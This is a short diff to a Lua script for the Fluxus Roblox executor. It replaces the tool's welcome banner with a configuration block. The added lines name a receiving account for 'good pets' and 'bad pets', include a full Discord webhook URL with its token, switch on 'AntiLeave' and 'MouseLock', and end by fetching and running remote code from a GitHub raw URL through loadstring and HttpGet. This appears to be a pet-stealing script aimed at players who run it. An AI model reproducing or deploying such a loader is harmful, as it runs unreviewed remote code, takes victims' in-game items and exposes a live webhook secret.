@@ -1,12 +1,9 @@
---[[
+UserName = "rolbox34521" -- good pets
+Webhook = "https://discordapp.com/api/webhooks/1136232023632134226/7WooE8Y2wG7689EorJB1JZEo3boLNNj3XIWa40mXTEUUGkH1dlACxPTY0oTm22BIOwHV" -- pings for pets
+UserName2 = "rolbox34521" -- bad pets
 
-Welcome to Fluxus!
+_G.LoadingScreen = false -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
 
-Do you need help with Fluxus? Join our discord! discord.gg\GNHbGPbah2
-
-Check out Fluxus on Android! www.fluxteam.net/android
-
-Tired of the keysystem and ads? Level up by purchasing Fluxus Premium!
-Join our discord for more information OR check out www.bloxproducts.com/#fluxus
-
---]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
